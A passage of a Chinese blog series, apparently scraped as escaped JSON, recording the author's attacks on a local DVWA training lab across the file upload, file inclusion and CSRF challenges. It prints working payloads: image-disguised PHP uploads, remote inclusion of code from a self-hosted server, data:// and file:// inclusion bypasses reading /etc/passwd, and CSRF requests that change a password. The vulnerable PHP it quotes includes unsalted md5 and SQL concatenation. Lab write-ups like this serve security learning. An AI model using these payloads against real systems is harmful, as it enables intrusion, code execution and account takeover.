// No  echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;\u0026#39;; } else { // Yes!  echo \u0026#34;\u0026lt;pre\u0026gt;{$target_path}succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026#34;; } } else { // Invalid file  echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded. We can only accept JPEG or PNG images.\u0026lt;/pre\u0026gt;\u0026#39;; } } ?\u0026gt;  注意到改为使用文件后缀名判断，但取后缀名的逻辑有点意思：$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);\nstrrpos 会返回最后一次出现.的位置，然后substr从这个位置+1截取字符串，比如1.jpg就会取到jpg。直觉告诉我可以转义或者%00截断来解决这个问题，直接在 medium 难度的 payload 上改一改文件名1.php%00.jpg，然后贴进控制台试试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  await fetch(\u0026#34;http://localhost:8080/vulnerabilities/upload/#\u0026#34;, { \u0026#34;credentials\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;headers\u0026#34;: { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;Sec-Fetch-Dest\u0026#34;: \u0026#34;document\u0026#34;, \u0026#34;Sec-Fetch-Mode\u0026#34;: \u0026#34;navigate\u0026#34;, \u0026#34;Sec-Fetch-Site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;Sec-Fetch-User\u0026#34;: \u0026#34;?1\u0026#34; }, \u0026#34;referrer\u0026#34;: \u0026#34;http://localhost:8080/vulnerabilities/upload/\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;MAX_FILE_SIZE\\\u0026#34;\\r\\n\\r\\n100000\\r\\n-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;uploaded\\\u0026#34;; filename=\\\u0026#34;3.php%00.jpg\\\u0026#34;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n\u0026lt;?php phpinfo(); ?\u0026gt;\\r\\n-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;Upload\\\u0026#34;\\r\\n\\r\\nUpload\\r\\n-----------------------------257607891334311387353687588123--\\r\\n\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;cors\u0026#34; });   观察响应发现不成功。直接放弃转义的想法，重新审阅下代码，没想出怎么直接 bypass 了。不过考虑是可以利用 apache 或者 nginx 的文件名解析漏洞，但我这个容器用了新版 apache 所以大概是不可行的=。=\n另一种解法是利用文件包含漏洞，这个比较容易，改一下上面的 payload 把文件名改成 3.jpg。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  await fetch(\u0026#34;http://localhost:8080/vulnerabilities/upload/#\u0026#34;, { \u0026#34;credentials\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;headers\u0026#34;: { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;Sec-Fetch-Dest\u0026#34;: \u0026#34;document\u0026#34;, \u0026#34;Sec-Fetch-Mode\u0026#34;: \u0026#34;navigate\u0026#34;, \u0026#34;Sec-Fetch-Site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;Sec-Fetch-User\u0026#34;: \u0026#34;?1\u0026#34; }, \u0026#34;referrer\u0026#34;: \u0026#34;http://localhost:8080/vulnerabilities/upload/\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;MAX_FILE_SIZE\\\u0026#34;\\r\\n\\r\\n100000\\r\\n-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;uploaded\\\u0026#34;; filename=\\\u0026#34;3.jpg\\\u0026#34;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n\u0026lt;?php phpinfo(); ?\u0026gt;\\r\\n-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;Upload\\\u0026#34;\\r\\n\\r\\nUpload\\r\\n-----------------------------257607891334311387353687588123--\\r\\n\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;cors\u0026#34; });   结果还是不行，重新审阅代码，注意到一个新出现的函数 getimagesize，查询文档得知是获取图片大小的函数，可能会读取文件内容=，=而我的图片不是合法的图片所以就寄了。于是再改一改，直接这次把 payload 附加在正常图片后。不过这次选择的是 jpg 后缀名和 svg 文件内容（防止jpg图片的二进制数据把php解释器搞挂了）。payload 改成如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  await fetch(\u0026#34;http://localhost:8080/vulnerabilities/upload/#\u0026#34;, { \u0026#34;credentials\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;headers\u0026#34;: { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;Sec-Fetch-Dest\u0026#34;: \u0026#34;document\u0026#34;, \u0026#34;Sec-Fetch-Mode\u0026#34;: \u0026#34;navigate\u0026#34;, \u0026#34;Sec-Fetch-Site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;Sec-Fetch-User\u0026#34;: \u0026#34;?1\u0026#34; }, \u0026#34;referrer\u0026#34;: \u0026#34;http://localhost:8080/vulnerabilities/upload/\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;MAX_FILE_SIZE\\\u0026#34;\\r\\n\\r\\n100000\\r\\n-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;uploaded\\\u0026#34;; filename=\\\u0026#34;3.jpg\\\u0026#34;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n\u0026lt;svg version=\\\u0026#34;1.1\\\u0026#34; id=\\\u0026#34;Capa_1\\\u0026#34; xmlns=\\\u0026#34;http://www.w3.org/2000/svg\\\u0026#34; xmlns:xlink=\\\u0026#34;http://www.w3.org/1999/xlink\\\u0026#34; x=\\\u0026#34;0px\\\u0026#34; y=\\\u0026#34;0px\\\u0026#34; width=\\\u0026#34;400px\\\u0026#34; height=\\\u0026#34;738px\\\u0026#34; viewBox=\\\u0026#34;0 0 400 738\\\u0026#34; enable-background=\\\u0026#34;new 0 0 400 738\\\u0026#34; xml:space=\\\u0026#34;preserve\\\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt;\u0026lt;?php phpinfo(); ?\u0026gt;\\r\\n-----------------------------257607891334311387353687588123\\r\\nContent-Disposition: form-data; name=\\\u0026#34;Upload\\\u0026#34;\\r\\n\\r\\nUpload\\r\\n-----------------------------257607891334311387353687588123--\\r\\n\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;cors\u0026#34; });   然后再提交，依然不行，淦。这次改成绝对正常的图片附带phpinfo。\n上传！失败而且发现一个警告：\n1  Warning: getimagesize(): Filename cannot be empty in /var/www/html/vulnerabilities/upload/source/high.php on line 17   调试 dvwa 代码后发现是 dvwa 代码里没检查错误，上传失败的原因是图片太大超过了表单限制=。=\n1 2  ( $uploaded_size \u0026lt; 100000 ) \u0026amp;\u0026amp; // 实际上 php 在 $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;size\u0026#39; ] 设置的是 0，error 是 2  getimagesize( $uploaded_tmp )   正确做法应该是先检查错误：\n1 2 3  ( $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;error\u0026#39; ] === 0) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) \u0026amp;\u0026amp; getimagesize( $uploaded_tmp )   不然 $uploaded_tmp 始终是空字符串的情况下，只会提示 filename cannot be empty 就很不友好=。=我不确定这算不算 bug 但反正对我这样不太熟悉 php 的人不友好，强行 echo var_dump($_FILES[ 'uploaded' ]); 才发现有个 error 被设置成了 2。如果没有这个 error 的话我可能就要懵上几天了。\n总之，发现问题原因之后，解决之。\n把图片放tinypng压缩一下（160k =\u0026gt; 6k），然后重新用正常图片带 payload，然后在文件包含这一节的漏洞包含这个png文件完成利用。\n完成。\n总结 阻止上传的文件没有夹带私货基本不太可能，毕竟可以用各种乱七八糟的办法把代码隐藏起来，比如编码成像素。但阻止利用还是可以的，把文件包含的洞和文件名解析的洞堵上，传个图片马之类的就没什么用了。图片马应该也能通过搜索文件内容是否包含特定字节序列（比如\u0026lt;?php）来堵一部分利用方式吧，虽然说有误杀的可能。\n还有种做法是考虑不要把上传文件存到可能被当代码解析的地方，比如和代码一起放在 /var/www/html。可以考虑下部署个 Ceph 之类的对象存储服务或者买大厂的对象存储。这样的话解析漏洞大概率是用不了了，包含漏洞也只要堵上远程包含就行。相应的对象存储服务本身有没有洞，有没有按最佳实践做好保护都会变成新问题=。=这属于是扩大攻击面了。\n不过编程习惯好的码农再加上一门合适的语言和技术选型，相对安全还是能有个大概的保障的吧，咱也不敢说死，毕竟菜，啥也不懂。但烂项目是真的可以很烂，之前玩弄过的一个 Android App 就非常山寨，居然秘钥都敢放客户端=。=这帮人到底怎么做的技术决策我是真的无法理解了。\n好了，哔哔完了。\n","date":"2022-04-27T12:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-05/","title":"DVWA上手记录-文件上传"},{"content":"前言 这次玩一下 DVWA 的文件包含。\n原理 PHP和include 在 php 语言中 include 表达式用于包含指定的文件，写过 C/C++ 应该对 #include 预处理指令比较熟，php 的 include 表达式和 #include 在某种程度上很相似，都是从指定的搜索路径里找到文件并“包含”进来。被包含的文件可以是 php 文件也可以是别的文件，这点和 #include 预处理器比较像。\n然后，因为 include 可以写做表达式的缘故，在 php 里可以 include $file，如果把用户传入的数据未经过检查就交给 include 的话就可能产生一个文件包含漏洞。\n 当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在有效的 PHP 起始和结束标记之中。\n 解释器的这个行为进一步拓宽了可利用的范围。\n 如果“URL include wrappers”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见支持的协议和封装协议）而不是本地文件来指定要被包含的文件。\n 对 include 参数有足够控制的情况下，可以利用远程包含来执行任意代码。挑选合适的 url 协议可以 bypass 不够严谨的参数检查。\n本地文件包含 本地文件包含一般可以是 include \u0026quot;some/folder/\u0026quot; . $_GET[\u0026quot;file\u0026quot;] . \u0026quot;.php\u0026quot; 或类似的形式，此时可以通过 file=../../malicious 这样的 payload 来包含任意代码。\n远程文件包含 此时对 include 参数有更强的控制，也可以通过 url 协议来远程包含 php 代码执行。或者 zlib:// 之类的协议直接把要执行的代码放在 payload 里。\n文件包含 信息收集 页面没有什么特别的，点击上面的 file1.php、file2.php、file3.php 能分别看到三个不同的子页面：\n注意地址栏会发现有意思的地方：\n 首页：http://localhost:8080/vulnerabilities/fi/?page=index.php file1：http://localhost:8080/vulnerabilities/fi/?page=file1.php file2：http://localhost:8080/vulnerabilities/fi/?page=file2.php file3：http://localhost:8080/vulnerabilities/fi/?page=file3.php  很直接地想到 index.php、file1.php、file2.php、file3.php就是被包含的文件了。尝试提交一个 page=file4.php，发现彩蛋。\n直接观察 dvwa 源码，可以发现 include 出现的位置是 dvwa/vulnerabilities/fi/index.php 里，php.ini 配置的 include_path 应该是包含当前目录 . 的，所以可以直接取相对路径包含任意文件。\n差不多就是这样了。\nLow难度 因为已经有一个 phpinfo 页面，我们先尝试包含一下。\n好的，直接成功。下一个问题是怎么 get shell。考虑服务在 docker 内，apache 的日志都链接到了 /dev/stdout 和 /dev/stderr，通过包含日志来执行代码是不行了。上传文件暂不考虑（因为还没开始做任意文件上传），故考虑下远程文件包含和利用url协议。\n先试一下远程文件包含。python3 -m http.server开个 http 服务器，下面放个 2.php，然后构造 url：http://localhost:8080/vulnerabilities/fi/?page=http://172.17.0.1:8000/2.php\n成功。\n提高难度：Medium 看看 Medium 难度下的代码。\n1 2 3 4 5 6 7 8 9 10  \u0026lt;?php // The page we wish to display $file = $_GET[ \u0026#39;page\u0026#39; ]; // Input validation $file = str_replace( array( \u0026#34;http://\u0026#34;, \u0026#34;https://\u0026#34; ), \u0026#34;\u0026#34;, $file ); $file = str_replace( array( \u0026#34;../\u0026#34;, \u0026#34;..\\\\\u0026#34; ), \u0026#34;\u0026#34;, $file ); ?\u0026gt;  用 str_replace 替换掉了 ../ 和 http:// 来解决目录穿越和 http 文件包含。但 php 支持的 url 协议显然不止这俩\u0026hellip;\n改成data://协议，重写一个 payload：http://localhost:8080/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=。这段 base64 是  echo '\u0026lt;?php phpinfo(); ?\u0026gt;' | base64 产生的。\n成功。\n提高难度：High High 难度下使用了 fnmatch 匹配文件名，但模式是 file*，所以还是有完蛋的可能。\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;?php // The page we wish to display $file = $_GET[ \u0026#39;page\u0026#39; ]; // Input validation if( !fnmatch( \u0026#34;file*\u0026#34;, $file ) \u0026amp;\u0026amp; $file != \u0026#34;include.php\u0026#34; ) { // This isn\u0026#39;t the page we want!  echo \u0026#34;ERROR: File not found!\u0026#34;; exit; } ?\u0026gt;  先试一下能不能用file://来 bypass 掉这个模式匹配。\n好的，成功 bypass 掉了这个模式，并且包含 /etc/passwd 成功了。不过/etc/shadow就没权限了。\n后续利用需要一个值得被包含的文件，如果服务器上有 mysql 配置之类的文件而且能读的话包含也不错。如果有上传点的话可以尝试传个马再包含。\n我太菜，虽然本地文件包含找出来了，想不到怎么用服务器上已有的文件去 get shell，日志包含又不可用。\n帮助文档 差不多三个难度都解好了，接着看下帮助文档拓宽下思路。\n Objective\nRead all five famous quotes from \u0026lsquo;../hackable/flags/fi.php\u0026rsquo; using only the file inclusion.\n 哦？目标是获取 hackable下的 flag。稍改下 payload 很快就拿到了fi.php的内容。\n 1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don\u0026rsquo;t know.\n\u0026ndash;LINE HIDDEN ;)\u0026ndash;\n4.) The pool on the roof must have a leak.\n 这个 LINE HIDDEN 有点怪，不是说 five famous quotes 吗，这只有4条。于是看了眼 fi.php，发现是这样的=。=并不是没完全拿到flag。我寻思要完全拿到的话可以在 get shell 之后把 fi.php 下载下来，不然单纯包含这个文件肯定是不行的。\nimpossible 难度代码长这样：\n1 2 3 4 5 6 7 8 9  // The page we wish to display $file = $_GET[ \u0026#39;page\u0026#39; ]; // Only allow include.php or file{1..3}.php if( $file != \u0026#34;include.php\u0026#34; \u0026amp;\u0026amp; $file != \u0026#34;file1.php\u0026#34; \u0026amp;\u0026amp; $file != \u0026#34;file2.php\u0026#34; \u0026amp;\u0026amp; $file != \u0026#34;file3.php\u0026#34; ) { // This isn\u0026#39;t the page we want! \techo \u0026#34;ERROR: File not found!\u0026#34;; exit; }   硬编码了所有可能的文件，如此一来就没有利用空间了。\n总结 文件包含这题感觉有点emmm\n怎么说呢，DVWA的题好像都有点简单过头的样子=。=虽然我是这么想但感觉作为一个才开始接触安全方面，学习时间一星期不到的人来说说出这话有点不应该，膨胀了。\n因为种种原因吧，感觉今年的自己特别焦躁。工资还只有这么点，事事不顺。一边劝自己知足，换工作不会改善现状，一边又焦虑自己一无所成。\n烦心。\n","date":"2022-04-26T15:07:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-04/","title":"DVWA上手记录-文件包含"},{"content":"前言 这次看下 DVWA 的 CSRF 题。\n昨天忙完了工作，闲下来的时间顺便看了下 DVWA 的部署。在我的 fork 分支里添加了 docker 支持。因为是纯新增，不太可能有 breaking change，直接在 GitHub 网页点点鼠标就能同步上游代码。这样就能用上最新的 DVWA 同时享受 docker 一键启动 DVWA 环境的快乐了。\n用法很简单：\n1 2 3  git clone https://github.com/nnnewb/dvwa cd dvwa docker-compose up -d --build   就这样！\n当然还有可能遇到一些网络问题，什么deb.debian.org访问慢或者timeout、connection reset之类的，但我觉得想玩这个的多少得有点自己动手解决问题的能力吧，不能跟三岁小孩一样等别人喂嘴里。\n原理 利用方式 CSRF 全名是跨站请求伪造 Cross Site Request Forgery 。\n简单地说，服务器相信收到的请求是用户控制浏览器发起的，是出于用户自身的意图做某些操作。但实际上，是另一个恶意网站的 js 脚本控制了用户的浏览器，在用户不知情的情况下，冒充用户的身份请求服务器做一些并非出自用户本意的操作。\nCSRF 利用中有三个组成部分：\n 用户浏览器 目标服务器 恶意网站  用户不访问恶意网站，CSRF 攻击就无从谈起。\n和CORS的关系 说没关系其实也有。CORS全称是 Cross Origin Resource Sharing，跨域资源共享，也是防浏览器被恶意网站控制着，背着用户拿自己的数据。但有所不同的是，CORS 其实是相当宽松的，因为 CORS 只要求浏览器对 “复杂请求” 发送预检，但简单请求（注意哦，包括 POST 请求，但只能包含指定的 Header 和限定的 Content-Type）会直接呈交给服务器。\n而且这个请求是可以带 Cookies 的，也就是说只要接口满足条件（接受限定的 Content-Type，对 Header 没有要求），CORS 策略就没法阻止 CSRF 攻击。\n举一个更实际的例子，哪怕恶意网站只是写了一个简单的表单：\n1 2 3 4  \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;http://good.com/some/action\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; value=\u0026#34;hello\u0026#34;/\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt;   也满足 CORS 对于 简单请求 的定义，浏览器不会阻止或预检。\n因此，即使配置良好的 CORS，也无法杜绝 CSRF 攻击。但 CORS 确实是防御 CSRF 攻击的重要环节。\n防御 防御CSRF攻击说难不难，因为发起 CSRF 攻击有几个重要前提：\n 基于 Cookies 的会话控制 没有不可预测的请求参数  基于上面两点：\n如果会话控制存在于自定义的 HTTP 头或 Cookies 之外的 HTTP 头（比如Authorization），那么 CORS 就会要求先发出一个预检请求，只有在服务器返回 Access-Control-Allow-Origin 包含当前域名的时候才会正式发出请求。这样一来除非先 bypass CORS ，不然就无法发起 CSRF 攻击。\n另一种就是增加一个攻击者不可预测的参数，也就是常说的 CSRF Token。\nCSRF Token 是一个和会话绑定的随机（至少对攻击者来说不可预知的）字符串（或别的数据类型）。CSRF 的作用原理依然是要依靠 CORS，恶意网站如果要伪造请求提交一个表单，那就必须拿到 CSRF Token，想获取 CSRF Token 就必须拿到表单所在的页面，而请求表单页面就必须满足 CORS 策略——即使是简单请求，没有预检，浏览器在收到响应后也会根据 Access-Control-Allow-Origin 的设定拒绝给 XHR 返回数据。网页拿不到 CSRF Token，自然也就没办法伪造出请求。\n解题 信息收集 好的，就是踩点。\n一个修改密码的页面，只有登陆用户能修改自己的密码（因为不登陆根本看不到这个页面）。另外还提供了一个测试登陆的地方，就是那个 Test Credentials 按钮。\n在测试登陆这里输入自己的用户名密码（默认是 admin,password）会提示valid password for 'admin'。\n修改密码的地方我们也试一试。\n修改后提示 Password changed，观察下 F12 调试器里的请求和响应头。\n接着看一眼表单代码。\n只有我觉得form里method=GET是很怪的事情吗？感觉学会写 HTML 以来就没想过在 form 里用 GET 方法\u0026hellip;\n咳，回到正题。\n到这里踩点差不多就结束了，可以发现 Low 难度下表单没有 CSRF Token 保护，因此可以简单直接写一个 XHR 修改掉密码。\n题解 必须先提一个我实际下手写的时候才踩到的坑，浏览器发展速度实在太快了。\n在RFC6265bis里引入了一个新的 Cookies 属性，SameSite。2019年5月份，谷歌宣布推出了一个默认安全的 Cookie 安全模型，由新的 Cookie 分类系统（规范）提供支持。在规范（PS：同样是谷歌提出的）中将 SameSite 默认设置为 Lax，只允许 Cookies 与顶级导航（包括第三方网站发起的GET请求）一起发送。\n这么说可能有点不好理解，我写了一个简单的 demo，在这项改动之前应该是带上 Cookies 直接发出的请求。\n1 2 3 4  var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;get\u0026#34;, \u0026#34;http://localhost:8080/vulnerabilities/csrf/?password_new=admin\u0026amp;password_conf=admin\u0026amp;Change=Change\u0026#34;); xhr.withCredentials = true; xhr.send();   但在这项改动之后（现在是2022年4月25日，Chrome内核版本 100，Edge 浏览器），虽然这是个简单请求，无需预检就会发送，但因为 Cookies 的 SameSite 属性变更为默认 Lax 的原因，即使设置了 withCredentials=true 请求里也不会带上 Cookies。\n这就有点恼人，不过稍作变通，还是可以直接控制用户的浏览器发起修改密码的请求，只是没 xhr 那么悄无声息。\n1  window.location.href=\u0026#39;http://localhost:8080/vulnerabilities/csrf/?password_new=123456\u0026amp;password_conf=123456\u0026amp;Change=Change\u0026#39;   如此一来，就满足了 SameSite=Lax 的由顶级导航启动的要求。\n这里额外再说一句就是，iframe 似乎也不被视作顶级导航，因此\u0026lt;iframe src=\u0026quot;...\u0026quot; width=\u0026quot;1\u0026quot; height=\u0026quot;1\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;也行不通，不会带上 Cookies。\n简单看了下 MDN 对默认 Lax 策略的支持情况，只有少数几个浏览器还没跟进了。\n代码审计 又是很短一段 php 代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  \u0026lt;?php if( isset( $_GET[ \u0026#39;Change\u0026#39; ] ) ) { // Get input  $pass_new = $_GET[ \u0026#39;password_new\u0026#39; ]; $pass_conf = $_GET[ \u0026#39;password_conf\u0026#39; ]; // Do the passwords match?  if( $pass_new == $pass_conf ) { // They do!  $pass_new = ((isset($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $pass_new ) : ((trigger_error(\u0026#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026#34;, E_USER_ERROR)) ? \u0026#34;\u0026#34; : \u0026#34;\u0026#34;)); $pass_new = md5( $pass_new ); // Update the database  $insert = \u0026#34;UPDATE `users` SET password = \u0026#39;$pass_new\u0026#39; WHERE user = \u0026#39;\u0026#34; . dvwaCurrentUser() . \u0026#34;\u0026#39;;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $insert ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . ((is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_error($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); // Feedback for the user  echo \u0026#34;\u0026lt;pre\u0026gt;Password Changed.\u0026lt;/pre\u0026gt;\u0026#34;; } else { // Issue with passwords matching  echo \u0026#34;\u0026lt;pre\u0026gt;Passwords did not match.\u0026lt;/pre\u0026gt;\u0026#34;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]))) ? false : $___mysqli_res); } ?\u0026gt;  逻辑很清晰不啰嗦，注意到几个点：\n md5 未加盐哈希作为密码字段保存到数据库，得到了哈希有可能被逆推出密码。 直接拼了 dvwaCurrentUser()，目前不清楚这个函数里有没有做好转义处理，没处理可能存在 SQL 注入。  全程这个 $GLOBALS[\u0026quot;___mysqli_ston\u0026quot;] 到底是个什么玩意儿让我有点懵，搜索了下好像是 SQL 连接，类似 Go 中的 sql.DB 对象（意会好嘛）。\n别的问题就没看出来了。\n提高难度（败北） 直接使用 Low 难度下的方法，window.location.href，会报错：That request didn't look correct。\n简单看一下 Medium 难度下的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  \u0026lt;?php if( isset( $_GET[ \u0026#39;Change\u0026#39; ] ) ) { // Checks to see where the request came from  if( stripos( $_SERVER[ \u0026#39;HTTP_REFERER\u0026#39; ] ,$_SERVER[ \u0026#39;SERVER_NAME\u0026#39; ]) !== false ) { // Get input  $pass_new = $_GET[ \u0026#39;password_new\u0026#39; ]; $pass_conf = $_GET[ \u0026#39;password_conf\u0026#39; ]; // Do the passwords match?  if( $pass_new == $pass_conf ) { // They do!  $pass_new = ((isset($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $pass_new ) : ((trigger_error(\u0026#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026#34;, E_USER_ERROR)) ? \u0026#34;\u0026#34; : \u0026#34;\u0026#34;)); $pass_new = md5( $pass_new ); // Update the database  $insert = \u0026#34;UPDATE `users` SET password = \u0026#39;$pass_new\u0026#39; WHERE user = \u0026#39;\u0026#34; . dvwaCurrentUser() . \u0026#34;\u0026#39;;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $insert ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . ((is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_error($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); // Feedback for the user  echo \u0026#34;\u0026lt;pre\u0026gt;Password Changed.\u0026lt;/pre\u0026gt;\u0026#34;; } else { // Issue with passwords matching  echo \u0026#34;\u0026lt;pre\u0026gt;Passwords did not match.\u0026lt;/pre\u0026gt;\u0026#34;; } } else { // Didn\u0026#39;t come from a trusted source  echo \u0026#34;\u0026lt;pre\u0026gt;That request didn\u0026#39;t look correct.\u0026lt;/pre\u0026gt;\u0026#34;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]))) ? false : $___mysqli_res); } ?\u0026gt;  注意到主要变化在于进入业务处理前，加上了一条判断：if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )。\nstripos 函数查找子串出现在字符串里的位置，没找到的情况下返回false，这条判断的意思是在 HTTP_REFERER 里查找 SERVER_NAME 是否出现，如果出现才进一步处理。所以 Medium 难度下问题变成了怎么 bypass 这个判断。\n搜索 SERVER_NAME 的文档可以找到这样的说明：\n \u0026lsquo;SERVER_NAME\u0026rsquo;\nThe name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host.\n Note: Under Apache 2, you must set UseCanonicalName = On and ServerName. Otherwise, this value reflects the hostname supplied by the client, which can be spoofed. It is not safe to rely on this value in security-dependent contexts.\n  在 Apache2 环境下，如果没有正确配置 UseCanonicalName = On和ServerName的话，$_SERVER['SERVER_NAME']的值就是 HTTP 请求头里的 Hostname。\nHTTP_REFERER 的文档这样说：\n \u0026lsquo;HTTP_REFERER\u0026rsquo;\nThe address of the page (if any) which referred the user agent to the current page. This is set by the user agent. Not all user agents will set this, and some provide the ability to modify HTTP_REFERER as a feature. In short, it cannot really be trusted.\n 但遗憾的是，不管 Host 还是 Referer 都无法修改（受制于浏览器的约束），所以尽管文档里说可能存在安全隐患，但反正我这会儿想不出利用方法。\n于是看眼帮助文档，提示需要结合 XSS 